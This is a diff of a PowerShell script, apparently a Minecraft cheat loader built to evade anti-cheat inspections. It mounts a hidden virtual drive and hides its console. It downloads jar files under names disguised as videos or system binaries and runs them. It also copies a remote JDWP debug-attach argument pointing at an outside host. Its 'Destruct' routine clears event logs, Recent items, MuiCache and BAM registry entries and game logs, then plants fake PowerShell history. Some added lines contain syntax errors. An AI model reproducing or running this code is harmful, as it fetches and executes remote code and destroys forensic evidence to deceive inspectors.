@@ -57,70 +57,34 @@ try {
 $ConfirmPreference = 'None'
 $ErrorActionPreference = 'SilentlyContinue'
 # SHOW LOADING SCREEN
-# Create the form
-$form = New-Object System.Windows.Forms.Form
-$form.Text = 'By Zpat - FAX'
-$form.Size = New-Object System.Drawing.Size(942, 443)
-$form.StartPosition = 'CenterScreen'
-$form.BackColor = 'Black'
-# Set background color to black and make the window non-resizable
-$form.FormBorderStyle = 'FixedDialog'
-$form.MaximizeBox = $false
-$form.MinimizeBox = $false
-$form.BackColor = 'Black'  # Set background color of the form to black
-$form.ForeColor = 'White'  # Set text color for the form content
-$form.AllowResize = $false  # Prevent resizing
-$form.TopMost = $true  # Keep the form on top
 # Add a label to display ASCII art
 $asciiArt = @"
-██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
-██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
-███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
-██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
-██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
-╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
+   __   ____  ___   ___  _____  _______
+  / /  / __ \/ _ | / _ \/  _/ |/ / ___/
+ / /__/ /_/ / __ |/ // // //    / (_ / 
+/____/\____/_/ |_/____/___/_/|_/\___/
 "@
 $label = New-Object System.Windows.Forms.Label
 $label.Text = $asciiArt
-$label.Font = New-Object System.Drawing.Font('Courier New', 9)
-$label.ForeColor = 'Yellow'
+$label.Font = New-Object System.Drawing.Font("Consolas", 20)
+$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
 $label.AutoSize = $true
-$label.Location = New-Object System.Drawing.Point(50, 50)
-$label.Anchor = 'Top, Left'
+# Center the label within the form
+$label.Location = New-Object System.Drawing.Point(
+    [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
+    [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
+)
 $form.Controls.Add($label)
 # Adjust the label's location when the form resizes
 $form.add_SizeChanged({
     $label.Location = New-Object System.Drawing.Point(
         [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
-        [int]($form.ClientSize.Height * 0.1)  # Adjust vertical position
+        [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
     )
 })
-# Create a progress bar
-$progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Style = 'Continuous'
-$progressBar.Minimum = 0
-$progressBar.Maximum = 100
-$progressBar.Value = 0
-$progressBar.Width = 600
-$progressBar.Height = 20
-$progressBar.Location = New-Object System.Drawing.Point(
-    [int](($form.ClientSize.Width - $progressBar.Width) / 2),
-    [int]($label.Location.Y + $label.Height + 50)
-)
-$progressBar.Visible = $false
-$progressBar.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffff00")  # Set progress bar color to yellow
-$form.Controls.Add($progressBar)
 # Show the form
 $form.Show()
-# Simulate loading
-$loadingSteps = 100
-$stepDelay = 40  # Total time is approximately 4 seconds (100 steps * 40 ms)
-for ($i = 0; $i -le $loadingSteps; $i++) {
-    $progressBar.Value = $i
-    Start-Sleep -Milliseconds $stepDelay
-}
-# Close the loading form
-$form.Close()
+# END OF LOADING SCREEN
 # MAKE THE PARTITION --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Ensure the directory exists
 $vdiskPath = "C:\temp\ddr.vhd"
@@ -162,30 +126,9 @@ if ($disk.PartitionStyle -eq 'Raw') {
 $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z
 # Step 6: Format the volume with FAT32 and set label
 Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false
-# Create tmp folder on Z drive
-$zTmpPath = "Z:\tmp"
-if (-Not (Test-Path $zTmpPath)) {
-    New-Item -ItemType Directory -Path $zTmpPath
-}
-# Download the images to Z:\tmp
-$imageUrls = @{
-    "pr.png"      = "https://i.postimg.cc/sx8cz0pb/pr.png"  
-    "vlite.png"     = "https://i.postimg.cc/XNDx9XTx/vlite.png"  
-    "vv4.png"       = "https://i.postimg.cc/63pLvNcD/vv4.png"  
-    "pha.png"       = "https://i.postimg.cc/j5366kkC/pha.png"  
-    "inj.png"       = "https://i.postimg.cc/vHTnLzW6/inj.png"  
-    "det.png"       = "https://i.postimg.cc/8ktW63rS/det.png"  
-    "back.png"      = "https://i.postimg.cc/C5PqpBV1/back.png"  
-    "doom.png"      = "https://i.postimg.cc/Qt6QhnQh/doom.png"  
-}
-foreach ($imageName in $imageUrls.Keys) {
-    $imageUrl = $imageUrls[$imageName]
-    $imagePath = Join-Path -Path $zTmpPath -ChildPath $imageName
-    if (-Not (Test-Path $imagePath)) {
-        Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
-    }
-}
 # END OF MAKING PARTITION ------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Close the old form
+$form.Close()
 # Hide PowerShell console window
 Add-Type -Name Win -Namespace Console -MemberDefinition @'
     [DllImport("user32.dll")]
@@ -195,10 +138,10 @@ Add-Type -Name Win -Namespace Console -MemberDefinition @'
 '@
 $consolePtr = [Console.Win]::GetConsoleWindow()
 [Console.Win]::ShowWindow($consolePtr, 0)
-# Create the main form
+# Create the form
 $form = New-Object System.Windows.Forms.Form
 $form.Text = 'By Zpat - FAX'
-$form.Size = New-Object System.Drawing.Size(942, 443)
+$form.Size = New-Object System.Drawing.Size(950, 400)
 $form.StartPosition = 'CenterScreen'
 $form.BackColor = 'Black'
 # Set background color to black and make the window non-resizable
@@ -206,9 +149,11 @@ $form.FormBorderStyle = 'FixedDialog'
 $form.MaximizeBox = $false
 $form.MinimizeBox = $false
 $form.BackColor = 'Black'  # Set background color of the form to black
+# Set the title to empty (remove the title)
+$form.Text = "By Zpat - FAX" 
+# Set the top bar (title bar) color to black
+$form.BackColor = 'Black'  # Set background color for the whole form
 $form.ForeColor = 'White'  # Set text color for the form content
-$form.AllowResize = $false  # Prevent resizing
-$form.TopMost = $true  # Keep the form on top
 # ASCII Art Label
 $asciiArt = @"
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
@@ -221,276 +166,141 @@ $asciiArt = @"
 $label = New-Object System.Windows.Forms.Label
 $label.Text = $asciiArt
 $label.Font = New-Object System.Drawing.Font('Courier New', 9)
-$label.ForeColor = 'Yellow'
+$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")'
 $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(50, 50)
-$label.Anchor = 'Top, Left'
-$form.Controls.Add($label)
-# Adjust the label's location when the form resizes
-$form.add_SizeChanged({
-    $label.Location = New-Object System.Drawing.Point(
-        [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
-        [int]($form.ClientSize.Height * 0.1)  # Adjust vertical position
-    )
-})
-# Create a progress bar
-$progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Style = 'Continuous'
-$progressBar.Minimum = 0
-$progressBar.Maximum = 100
-$progressBar.Value = 0
-$progressBar.Width = 600
-$progressBar.Height = 20
-$progressBar.Location = New-Object System.Drawing.Point(
-    [int](($form.ClientSize.Width - $progressBar.Width) / 2),
-    [int]($label.Location.Y + $label.Height + 50)
-)
-$progressBar.Visible = $false
-$progressBar.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffff00")  # Set progress bar color to yellow
-$form.Controls.Add($progressBar)
+# Define Main Menu Buttons
+$injectButton = New-Object System.Windows.Forms.Button
+$injectButton.Text = 'Inject'
+$injectButton.Width = 100
+$injectButton.Height = 40
+$injectButton.Location = New-Object System.Drawing.Point(162.5, 200)  # Position the button
+$injectButton.BackColor = 'Green'
+$injectButton.ForeColor = 'Black'
+$destructButton = New-Object System.Windows.Forms.Button
+$destructButton.Text = 'Destruct'
+$destructButton.Width = 100
+$destructButton.Height = 40
+$destructButton.Location = New-Object System.Drawing.Point(687.5, 200)  # Position the button
+$destructButton.BackColor = 'Red'
+$destructButton.ForeColor = 'Black'
 # Function to return to main menu
 function Show-MainMenu {
     $form.Controls.Clear()
     $form.Controls.Add($label)
-    # Create PictureBox for Inject Button
-    $injectPictureBox = New-Object System.Windows.Forms.PictureBox
-    $injectPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "inj.png"))
-    $injectPictureBox.SizeMode = 'StretchImage'
-    $injectPictureBox.Width = 120
-    $injectPictureBox.Height = 44
-    $injectPictureBox.Location = New-Object System.Drawing.Point(
-        [int]($form.ClientSize.Width * 0.15),  # Adjust horizontal position
-        [int]($form.ClientSize.Height * 0.5)  # Adjust vertical position
-    )
-    $injectPictureBox.BackColor = 'Transparent'
-    $injectPictureBox.Add_MouseEnter({
-        $injectPictureBox.BorderStyle = 'FixedSingle'
-        $injectPictureBox.BackColor = 'Gray'
-        Start-JiggleEffect $injectPictureBox
-    })
-    $injectPictureBox.Add_MouseLeave({
-        $injectPictureBox.BorderStyle = 'None'
-        $injectPictureBox.BackColor = 'Transparent'
-    })
-    $injectPictureBox.Add_Click({
-        # Inject Button Click: Show Prestige and Vape buttons
-        # Disable the form to prevent interaction
-        $form.Enabled = $false
-        # Download the sound file
-        Download-SoundFile
-        # Load the sound player
-        $player = New-Object System.Media.SoundPlayer
-        $player.SoundLocation = $soundFilePath
-        # Play the custom sound
-        $player.PlaySync()
-        # Re-enable the form after sound playback
-        $form.Enabled = $true
-        $form.Controls.Clear()
-        $form.Controls.Add($label)
-        # Back Button
-        $backPictureBox = New-Object System.Windows.Forms.PictureBox
-        $backPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "back.png"))
-        $backPictureBox.SizeMode = 'StretchImage'
-        $backPictureBox.Width = 100
-        $backPictureBox.Height = 30
-        $backPictureBox.Location = New-Object System.Drawing.Point(
-            [int]($form.ClientSize.Width * 0.85),  # Adjust horizontal position
-            [int]($form.ClientSize.Height * 0.85)  # Adjust vertical position
-        )
-        $backPictureBox.BackColor = 'Transparent'
-        $backPictureBox.Add_MouseEnter({
-            $backPictureBox.BorderStyle = 'FixedSingle'
-            $backPictureBox.BackColor = 'Gray'
-            Start-JiggleEffect $backPictureBox
-        })
-        $backPictureBox.Add_MouseLeave({
-            $backPictureBox.BorderStyle = 'None'
-            $backPictureBox.BackColor = 'Transparent'
-        })
-        $backPictureBox.Add_Click({ Show-MainMenu })
-        # Prestige Button
-        $prestigePictureBox = New-Object System.Windows.Forms.PictureBox
-        $prestigePictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "pr.png"))
-        $prestigePictureBox.SizeMode = 'StretchImage'
-        $prestigePictureBox.Width = 120
-        $prestigePictureBox.Height = 120
-        $prestigePictureBox.Location = New-Object System.Drawing.Point(
-            [int]($form.ClientSize.Width * 0.15),  # Adjust horizontal position
-            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
-        )
-        $prestigePictureBox.BackColor = 'Transparent'
-        $prestigePictureBox.Add_MouseEnter({
-            $prestigePictureBox.BorderStyle = 'FixedSingle'
-            $prestigePictureBox.BackColor = 'Gray'
-            Start-JiggleEffect $prestigePictureBox
-        })
-        $prestigePictureBox.Add_MouseLeave({
-            $prestigePictureBox.BorderStyle = 'None'
-            $prestigePictureBox.BackColor = 'Transparent'
-        })
-        $prestigePictureBox.Add_Click({
-            if (-Not (Test-Path "Z:\meme.mp4")) {
-                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-fabric-0.6.13+mc1.21.4.jar"    -OutFile "Z:\meme.mp4"
-            }
-            Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
-        })
-        # Vapelite Button
-        $vapelitePictureBox = New-Object System.Windows.Forms.PictureBox
-        $vapelitePictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "vlite.png"))
-        $vapelitePictureBox.SizeMode = 'StretchImage'
-        $vapelitePictureBox.Width = 120
-        $vapelitePictureBox.Height = 120
-        $vapelitePictureBox.Location = New-Object System.Drawing.Point(
-            [int]($form.ClientSize.Width * 0.3),  # Adjust horizontal position
-            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
-        )
-        $vapelitePictureBox.BackColor = 'Transparent'
-        $vapelitePictureBox.Add_MouseEnter({
-            $vapelitePictureBox.BorderStyle = 'FixedSingle'
-            $vapelitePictureBox.BackColor = 'Gray'
-            Start-JiggleEffect $vapelitePictureBox
-        })
-        $vapelitePictureBox.Add_MouseLeave({
-            $vapelitePictureBox.BorderStyle = 'None'
-            $vapelitePictureBox.BackColor = 'Transparent'
-        })
-        $vapelitePictureBox.Add_Click({
-            if (-Not (Test-Path "Z:\will fix it when i wake up.txt")) {
-                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/fabric-installer-1.0.3.jar"    -OutFile "Z:\will fix it when i wake up.txt"
-            }
-            Start-Process "Z:\will fix it when i wake up.txt"
-        })
-        # Vapev4 Button
-        $vapev4PictureBox = New-Object System.Windows.Forms.PictureBox
-        $vapev4PictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "vv4.png"))
-        $vapev4PictureBox.SizeMode = 'StretchImage'
-        $vapev4PictureBox.Width = 120
-        $vapev4PictureBox.Height = 120
-        $vapev4PictureBox.Location = New-Object System.Drawing.Point(
-            [int]($form.ClientSize.Width * 0.45),  # Adjust horizontal position
-            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
-        )
-        $vapev4PictureBox.BackColor = 'Transparent'
-        $vapev4PictureBox.Add_MouseEnter({
-            $vapev4PictureBox.BorderStyle = 'FixedSingle'
-            $vapev4PictureBox.BackColor = 'Gray'
-            Start-JiggleEffect $vapev4PictureBox
-        })
-        $vapev4PictureBox.Add_MouseLeave({
-            $vapev4PictureBox.BorderStyle = 'None'
-            $vapev4PictureBox.BackColor = 'Transparent'
-        })
-        $vapev4PictureBox.Add_Click({
-            if (-Not (Test-Path "Z:\will fix it when i wake up.txt")) {
-                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar"    -OutFile "Z:\will fix it when i wake up.txt"
-            }
-            Start-Process "Z:\will fix it when i wake up.txt"
-        })
-        # Phantom Button
-        $phantomPictureBox = New-Object System.Windows.Forms.PictureBox
-        $phantomPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "pha.png"))
-        $phantomPictureBox.SizeMode = 'StretchImage'
-        $phantomPictureBox.Width = 120
-        $phantomPictureBox.Height = 120
-        $phantomPictureBox.Location = New-Object System.Drawing.Point(
-            [int]($form.ClientSize.Width * 0.6),  # Adjust horizontal position
-            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
-        )
-        $phantomPictureBox.BackColor = 'Transparent'
-        $phantomPictureBox.Add_MouseEnter({
-            $phantomPictureBox.BorderStyle = 'FixedSingle'
-            $phantomPictureBox.BackColor = 'Gray'
-            Start-JiggleEffect $phantomPictureBox
-        })
-        $phantomPictureBox.Add_MouseLeave({
-            $phantomPictureBox.BorderStyle = 'None'
-            $phantomPictureBox.BackColor = 'Transparent'
-        })
-        $phantomPictureBox.Add_Click({
-            $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
-            Set-Clipboard -Value $clipboardText
-        })
-        # Doom Button
-        $doomPictureBox = New-Object System.Windows.Forms.PictureBox
-        $doomPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "doom.png"))
-        $doomPictureBox.SizeMode = 'StretchImage'
-        $doomPictureBox.Width = 120
-        $doomPictureBox.Height = 120
-        $doomPictureBox.Location = New-Object System.Drawing.Point(
-            [int]($form.ClientSize.Width * 0.75),  # Adjust horizontal position
-            [int]($form.ClientSize.Height * 0.3)  # Adjust vertical position
-        )
-        $doomPictureBox.BackColor = 'Transparent'
-        $doomPictureBox.Add_MouseEnter({
-            $doomPictureBox.BorderStyle = 'FixedSingle'
-            $doomPictureBox.BackColor = 'Gray'
-            Start-JiggleEffect $doomPictureBox
-        })
-        $doomPictureBox.Add_MouseLeave({
-            $doomPictureBox.BorderStyle = 'None'
-            $doomPictureBox.BackColor = 'Transparent'
-        })
-        $doomPictureBox.Add_Click({
-            if (-Not (Test-Path "Z:\cat.mp4")) {
-                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium-extra/sodium-extra-fabric-0.6.1+mc1.21.4.jar"  -OutFile "Z:\cat.mp4"
-            }
-            # Start-Process "Z:\cat.mp4"  # Uncomment and fill in the command as needed
-        })
-        # Add PictureBoxes to form
-        $form.Controls.Add($prestigePictureBox)
-        $form.Controls.Add($vapelitePictureBox)
-        $form.Controls.Add($backPictureBox)
-        $form.Controls.Add($vapev4PictureBox)
-        $form.Controls.Add($phantomPictureBox)
-        $form.Controls.Add($doomPictureBox)
-    })
-    # Create PictureBox for Destruct Button
-    $destructPictureBox = New-Object System.Windows.Forms.PictureBox
-    $destructPictureBox.Image = [System.Drawing.Image]::FromFile((Join-Path -Path $zTmpPath -ChildPath "det.png"))
-    $destructPictureBox.SizeMode = 'StretchImage'
-    $destructPictureBox.Width = 112
-    $destructPictureBox.Height = 27
-    $destructPictureBox.Location = New-Object System.Drawing.Point(
-        [int]($form.ClientSize.Width * 0.75),  # Adjust horizontal position
-        [int]($form.ClientSize.Height * 0.5)  # Adjust vertical position
-    )
-    $destructPictureBox.BackColor = 'Transparent'
-    $destructPictureBox.Add_MouseEnter({
-        $destructPictureBox.BorderStyle = 'FixedSingle'
-        $destructPictureBox.BackColor = 'Gray'
-        Start-JiggleEffect $destructPictureBox
-    })
-    $destructPictureBox.Add_MouseLeave({
-        $destructPictureBox.BorderStyle = 'None'
-        $destructPictureBox.BackColor = 'Transparent'
-    })
-    $destructPictureBox.Add_Click({
-        # Disable the form to prevent interaction
-        $form.Enabled = $false
-        # Show progress bar
-        $progressBar.Value = 0
-        $progressBar.Visible = $true
-        # Start background worker
-        $backgroundWorker.RunWorkerAsync()
-    })
-    # Add PictureBoxes to form
-    $form.Controls.Add($injectPictureBox)
-    $form.Controls.Add($destructPictureBox)
+    $form.Controls.Add($injectButton)
+    $form.Controls.Add($destructButton)
 }
 # Path to the custom sound file on Z drive
-$soundFilePath = Join-Path -Path $zTmpPath -ChildPath "a.wav"
+$soundFilePath = "Z:\na.wav"
+
 # Function to download the sound file
 function Download-SoundFile {
-    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"   # Replace with the actual URL of the sound file
-    if (-Not (Test-Path $soundFilePath)) {
-        Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath
+    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"  # Replace with the actual URL of the sound file
+    try {
+        iwr -Uri $soundUrl -OutFile $soundFilePath
+    } catch {
+        Write-Error "Failed to download sound file: $_"
+        exit 1
     }
 }
-# Create background worker
-$backgroundWorker = New-Object System.ComponentModel.BackgroundWorker
-$backgroundWorker.WorkerReportsProgress = $true
-$backgroundWorker.DoWork = {
-    param($sender, $e)
+
+# Inject Button Click: Show Prestige and Vape buttons
+$injectButton.Add_Click({
+    # Disable the form to prevent interaction
+    $form.Enabled = $false
+    
+    # Download the sound file
+    Download-SoundFile
+    
+    # Load the sound player
+    $player = New-Object System.Media.SoundPlayer
+    $player.SoundLocation = $soundFilePath
+    
+    # Play the custom sound
+    $player.PlaySync()
+    
+    # Re-enable the form after sound playback
+    $form.Enabled = $true
+    
+    $form.Controls.Clear()
+    $form.Controls.Add($label)
+    # Back Button
+    $backButton = New-Object System.Windows.Forms.Button
+    $backButton.Text = 'Back'
+    $backButton.Width = 100
+    $backButton.Height = 40
+    $backButton.Location = New-Object System.Drawing.Point(800, 320)
+    $backButton.BackColor = 'DarkRed'
+    $backButton.ForeColor = 'Black'
+    $backButton.Add_Click({ Show-MainMenu })
+    # Prestige Button
+    $prestigeButton = New-Object System.Windows.Forms.Button
+    $prestigeButton.Text = 'Prestige'
+    $prestigeButton.Width = 120
+    $prestigeButton.Height = 40
+    $prestigeButton.Location = New-Object System.Drawing.Point(150, 200)
+    $prestigeButton.BackColor = 'Purple'
+    $prestigeButton.ForeColor = 'Black'
+    # Vapelite Button
+    $vapeliteButton = New-Object System.Windows.Forms.Button
+    $vapeliteButton.Text = 'VapeLite'
+    $vapeliteButton.Width = 120
+    $vapeliteButton.Height = 40
+    $vapeliteButton.Location = New-Object System.Drawing.Point(300, 200)
+    $vapeliteButton.BackColor = 'LightBlue'
+    $vapeliteButton.ForeColor = 'Black'
+    # Vapev4 Button
+    $vapev4Button = New-Object System.Windows.Forms.Button
+    $vapev4Button.Text = 'VapeV4'
+    $vapev4Button.Width = 120
+    $vapev4Button.Height = 40
+    $vapev4Button.Location = New-Object System.Drawing.Point(450, 200)
+    $vapev4Button.BackColor = 'Blue'
+    $vapev4Button.ForeColor = 'Black'
+    # Phantom Button
+    $phantomButton = New-Object System.Windows.Forms.Button
+    $phantomButton.Text = 'Phantom'
+    $phantomButton.Width = 120
+    $phantomButton.Height = 40
+    $phantomButton.Location = New-Object System.Drawing.Point(600, 200)
+    $phantomButton.BackColor = 'Red'
+    $phantomButton.ForeColor = 'Black'
+    $phantomButton.Add_Click({
+        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
+        Set-Clipboard -Value $clipboardText
+    })
+    # Add buttons to form
+    $form.Controls.Add($prestigeButton)
+    $form.Controls.Add($vapeliteButton)
+    $form.Controls.Add($backButton)
+    $form.Controls.Add($vapev4Button)
+    $form.Controls.Add($phantomButton)
+    # === YOUR CUSTOM PRESTIGE LOGIC HERE ===
+    $prestigeButton.Add_Click({
+        if (-Not (Test-Path "Z:\meme.mp4")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\meme.mp4"
+        }
+        Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
+    })
+    # === YOUR CUSTOM VAPELITE LOGIC HERE ===
+    $vapeliteButton.Add_Click({
+        if (-Not (Test-Path "Z:\ilasm.exe")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/fabric-installer-1.0.3.jar"  -OutFile "Z:\ilasm.exe"
+        }
+        Start-Process "Z:\ilasm.exe"
+    })
+    # === YOUR CUSTOM VAPEV4 LOGIC HERE ===
+    $vapev4Button.Add_Click({
+        if (-Not (Test-Path "Z:\ngentask.exe")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar"  -OutFile "Z:\ngentask.exe"
+        }
+        Start-Process "Z:\ngentask.exe"
+    })
+})
+
+# Destruct Button
+$destructButton.Add_Click({
     # Path to the virtual disk
     $vdiskPath = "C:\temp\ddr.vhd"
     # STEP 1: Get the virtual disk's associated disk number
@@ -499,7 +309,7 @@ $backgroundWorker.DoWork = {
     if ($diskList) {
         $diskNumber = $diskList.Number
     } else {
-        $sender.ReportProgress(100, "Virtual disk not found or not attached. Aborting destruction.")
+        Write-Host "Virtual disk not found or not attached. Aborting destruction."
         return
     }
     # STEP 2: Detach the virtual disk
@@ -511,88 +321,72 @@ detach vdisk
     $detachScript | Set-Content -Path $detachFile
     diskpart /s $detachFile | Out-Null
     Remove-Item -Path $detachFile -Force
-    $sender.ReportProgress(20)
-    # STEP 3: Delete the virtual disk file
+    # STEP 3: Initialize the disk (if needed)
+    $initializeScript = @"
+select disk $diskNumber
+online disk
+convert mbr
+"@
+    $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+    $initializeScript | Set-Content -Path $initFile
+    diskpart /s $initFile | Out-Null
+    Remove-Item -Path $initFile -Force
+    # STEP 4: Create partition and assign drive letter
+    $partitionScript = @"
+select disk $diskNumber
+create partition primary
+assign letter=Z
+"@
+    $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+    $partitionScript | Set-Content -Path $partFile
+    diskpart /s $partFile | Out-Null
+    Remove-Item -Path $partFile -Force
+    # STEP 5: Delete the virtual disk file
     if (Test-Path $vdiskPath) {
         Remove-Item -Path $vdiskPath -Force
     }
-    $sender.ReportProgress(40)
-    # STEP 4: Clean up "Recent" shortcuts
+    # STEP 6: Clean up "Recent" shortcuts
     $recentPath = [Environment]::GetFolderPath("Recent")
     Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
         Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
     }
-    $sender.ReportProgress(60)
     # Destruct other stuff after disk is gone
     Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
     Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
     # Clear Temp
     Remove-Item -Path "C:\temp\*" -Recurse -Force
-    Stop-Process -Name vds -Force -ErrorAction SilentlyContinue
-    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force -ErrorAction SilentlyContinue
+    Stop-Process -Name vds -Force
+    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
     # Event logs
-    Clear-EventLog -LogName System -ErrorAction SilentlyContinue
-    wevtutil cl "Windows PowerShell" -ErrorAction SilentlyContinue
+    Clear-EventLog -LogName System
+    wevtutil cl "Windows PowerShell"
     # Remove Stuff from MuiCache
-    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache -ErrorAction SilentlyContinue |
+    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
     ForEach-Object { $_.PSObject.Properties } |
     Where-Object { $_.Name -like "Z:\*" } |
-    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name -ErrorAction SilentlyContinue }
+    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name }
     # BAM
-    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -ErrorAction SilentlyContinue | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name -ErrorAction SilentlyContinue }
+    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
     # Conhost History
-    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1   | iex' -ErrorAction SilentlyContinue
+    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1  | iex'
     # Clear JVM args logs and traces by clearing content
     $jvmLogFiles = @(
         "$env:USERPROFILE\.java\deployment\log\*.log",
         "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
-        "$env:USERPROFILE\AppData\Local\Sun\Java\Deployment\log\*.log",
-        "$env:USERPROFILE\AppData\Roaming\Sun\Java\Deployment\log\*.log"
+        "$env:USERPROFILE\AppData\Roaming\.minecraft\logs\*.log",
+        "$env:USERPROFILE\AppData\Roaming\.minecraft\feather\logs\*.log"
     )
     foreach ($file in $jvmLogFiles) {
         Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
             Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
         }
     }
-    $sender.ReportProgress(100)
     # Stop the script process
-    Stop-Process -Id $PID -ErrorAction SilentlyContinue
-}
-$backgroundWorker.ProgressChanged = {
-    param($sender, $e)
-    $progressBar.Value = $e.ProgressPercentage
-    if ($e.UserState) {
-        # Display error message if any
-        [System.Windows.Forms.MessageBox]::Show($e.UserState, "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
-    }
-}
-$backgroundWorker.RunWorkerCompleted = {
-    param($sender, $e)
-    $progressBar.Visible = $false
-    $form.Enabled = $true
-    if ($e.Error) {
-        [System.Windows.Forms.MessageBox]::Show("An error occurred during destruction: $($e.Error.Message)", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
-    }
-}
-# Function to start jiggle effect
-function Start-JiggleEffect {
-    param($pictureBox)
-    $originalLocation = $pictureBox.Location
